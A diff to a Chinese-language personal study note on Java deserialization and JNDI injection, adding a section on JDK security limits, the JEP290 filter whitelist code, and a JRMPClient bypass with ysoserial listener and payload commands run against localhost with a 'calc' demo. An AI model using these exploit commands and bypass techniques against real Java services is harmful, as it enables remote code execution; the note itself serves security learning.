@@ -16,6 +16,7 @@ summary: 系统学习，作个人备忘
   + [RMI](#rmi)
   + [LDAP](#ldap)
   + [JNDI](#jndi)
+  + [安全限制](#安全限制)
   + [Gadgets](#gadgets)
   + [Vuln](#vuln)
 
@@ -305,7 +306,7 @@ System.out.println(new String(buf));
 
 Java中对http(s)：
 
-+ 默认启用NTLM认证
++ 默认启用NTLM认证（`tryTransparentNTLMServer` is always true，2011.1.10的JDK7中引入，2018.10.8修复）
 
 + 默认跟随跳转
   + 但Location头的protocol和原始请求protocol得相同
@@ -501,12 +502,46 @@ LDAP：
 1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
 2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。LDAP除了可通过Reference指定CodeBase外，还可返回javaSerializedData
 
-### 所以总结一下JNDI的几种攻击方式
+### 总结一下JNDI的几种攻击方式
 
 + RMI + JRMP serialized data
 + RMI + JNDI naming reference
 + LDAP + JNDI naming reference
 + 高于JDK8u191的两种利用方式
+
+## 安全限制
+
++ RMI codebase：`5u45、6u45、7u21、8u121`
+
++ LDAP codebase：`JDK11.0.1、8u191、7u201、6u211`
+
++ JEP290：反序列化过程中增加`filterCheck`
+
+  ```java
+  if (String.class == clazz
+      || java.lang.Number.class.isAssignableFrom(clazz)
+      || Remote.class.isAssignableFrom(clazz)
+      || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
+      || UnicastRef.class.isAssignableFrom(clazz)
+      || RMIClientSocketFactory.class.isAssignableFrom(clazz)
+      || RMIServerSocketFactory.class.isAssignableFrom(clazz)
+      || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
+      || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
+      return ObjectInputFilter.Status.ALLOWED;
+  } else {
+      return ObjectInputFilter.Status.REJECTED;
+  }
+  ```
+
+  `ysoserial.payload.JRMPClient`中使用UnicastRef绕过
+
+  ```
+  java -cp ysoserial.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections5 calc
+  
+  java -jar ysoserial.jar JRMPClient 127.0.0.1:23333 > exp
+  ```
+
+  PowerShell直接重定向的话，由于默认UTF16编码，序列化数据魔数会出错，Windows10 1903上使用cmd没问题
 
 ## Gadgets
 
